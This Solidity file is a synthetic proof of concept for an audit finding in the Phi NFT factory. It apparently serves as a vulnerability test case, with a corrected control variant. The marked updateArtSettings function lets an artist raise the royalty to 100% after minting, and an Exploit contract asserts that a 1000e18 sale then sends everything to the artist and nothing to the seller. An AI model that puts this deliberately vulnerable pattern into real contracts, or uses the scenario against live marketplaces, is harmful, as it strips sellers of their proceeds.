// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Phi — updateArtSettings rewrites royalty after mint
    (Code4rena 2024-08, finding 41093).
    SYNTHETIC, cheatcode-free. The updateRoyalties call is the audited
    unrestricted write (@> VULN).
    Root cause: onlyArtCreator does not freeze settings once tokens exist.
    A holder minted under a 500 bps royalty. The artist then sets 10000 bps.
    A 1000e18 sale pays the artist 1000e18 instead of 50e18, and the seller
    receives 0 instead of 950e18. The control reverts the post-mint edit. */

struct RoyaltyConfiguration {
    uint32 royaltyBPS;
    address royaltyRecipient;
}

contract MockToken {
    string public name = "Sale";
    string public symbol = "SALE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ArtNFT {
    address public factory;
    RoyaltyConfiguration public royalties;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => bool)) public approved;

    function setFactory(address _factory) external {
        require(factory == address(0), "set");
        factory = _factory;
    }

    function mint(address to) external {
        require(msg.sender == factory, "factory");
        balanceOf[to] += 1;
    }

    function updateRoyalties(uint256, RoyaltyConfiguration memory configuration) external {
        require(msg.sender == factory, "factory");
        royalties = configuration;
    }

    function royaltyInfo(uint256 salePrice) external view returns (address receiver, uint256 royaltyAmount) {
        receiver = royalties.royaltyRecipient;
        royaltyAmount = (uint256(royalties.royaltyBPS) * salePrice) / 10_000;
    }

    function approve(address operator) external {
        approved[msg.sender][operator] = true;
    }

    function transferFrom(address from, address to) external {
        require(approved[from][msg.sender] || msg.sender == from, "nft");
        balanceOf[from] -= 1;
        balanceOf[to] += 1;
    }
}

contract PhiFactory {
    struct PhiArt {
        address artist;
        address receiver;
        uint256 maxSupply;
        uint256 mintFee;
        uint256 startTime;
        uint256 endTime;
        bool soulBounded;
        string uri;
        uint256 numberMinted;
    }

    PhiArt public art;
    ArtNFT public artNft;
    bool public corrected;

    constructor(address _artist, address _nft, bool _corrected) {
        corrected = _corrected;
        artNft = ArtNFT(_nft);
        art.artist = _artist;
        art.receiver = _artist;
        art.maxSupply = 100;
        art.mintFee = 0;
        art.startTime = 0;
        art.endTime = type(uint64).max;
        art.soulBounded = false;
        art.uri = "ipfs://original";
    }

    function initRoyalty() external {
        artNft.updateRoyalties(1, RoyaltyConfiguration({ royaltyBPS: 500, royaltyRecipient: art.artist }));
    }

    function mint(address to) external {
        art.numberMinted += 1;
        artNft.mint(to);
    }

    function updateArtSettings(
        uint256,
        string memory url_,
        address receiver_,
        uint256 maxSupply_,
        uint256 mintFee_,
        uint256 startTime_,
        uint256 endTime_,
        bool soulBounded_,
        RoyaltyConfiguration memory configuration
    ) external {
        require(art.artist == msg.sender, "creator");
        if (corrected && art.numberMinted > 0) {
            revert("frozen");
        }
        if (receiver_ == address(0)) revert("zero");
        if (endTime_ < startTime_) revert("range");
        if (endTime_ < block.timestamp) revert("past");
        if (art.numberMinted > maxSupply_) revert("supply");

        art.receiver = receiver_;
        art.maxSupply = maxSupply_;
        art.mintFee = mintFee_;
        art.startTime = startTime_;
        art.endTime = endTime_;
        art.soulBounded = soulBounded_;
        art.uri = url_;

        uint256 tokenId = 1;
        // @> VULN: royalty is rewritten after mint, so the next sale pays the new rate.
        artNft.updateRoyalties(tokenId, configuration);
    }
}

contract Market {
    MockToken public token;
    ArtNFT public nft;
    address public seller;
    address public buyer;
    uint256 public lastCut;

    constructor(address _token, address _nft, address _seller, address _buyer) {
        token = MockToken(_token);
        nft = ArtNFT(_nft);
        seller = _seller;
        buyer = _buyer;
    }

    function settle(uint256 price) external {
        (address receiver, uint256 cut) = nft.royaltyInfo(price);
        lastCut = cut;
        token.transferFrom(buyer, receiver, cut);
        if (price > cut) {
            token.transferFrom(buyer, seller, price - cut);
        }
        nft.transferFrom(seller, buyer);
    }
}

contract Payer {
    function approveToken(address token, address spender) external {
        MockToken(token).approve(spender, type(uint256).max);
    }

    function approveNft(address nft, address spender) external {
        ArtNFT(nft).approve(spender);
    }
}

contract Stack {
    MockToken public token;
    ArtNFT public nft;
    PhiFactory public factory;
    Market public market;
    Payer public seller;
    Payer public buyer;
    bool public updated;
    uint256 public constant SALE = 1000e18;

    constructor(bool corrected) {
        token = new MockToken();
        nft = new ArtNFT();
        factory = new PhiFactory(address(this), address(nft), corrected);
        nft.setFactory(address(factory));
        factory.initRoyalty();
        seller = new Payer();
        buyer = new Payer();
        market = new Market(address(token), address(nft), address(seller), address(buyer));
        factory.mint(address(seller));
        seller.approveNft(address(nft), address(market));
        token.mint(address(buyer), SALE);
        buyer.approveToken(address(token), address(market));
    }

    function go() external {
        try factory.updateArtSettings(
            1,
            "ipfs://changed",
            address(this),
            100,
            0,
            0,
            type(uint64).max,
            false,
            RoyaltyConfiguration({ royaltyBPS: 10_000, royaltyRecipient: address(this) })
        ) {
            updated = true;
        } catch {
            updated = false;
        }
        market.settle(SALE);
    }
}

contract Exploit {
    Stack public stack;

    constructor() {
        stack = new Stack(false);
    }

    function run() external {
        stack.go();
        uint256 artist = stack.token().balanceOf(address(stack));
        uint256 sellerBal = stack.token().balanceOf(address(stack.seller()));
        (uint32 bps,) = stack.nft().royalties();
        require(stack.updated(), "updated");
        require(bps == 10_000, "bps");
        require(artist == 1000e18, "artist");
        require(sellerBal == 0, "seller");
        require(stack.market().lastCut() == 1000e18, "cut");
    }
}
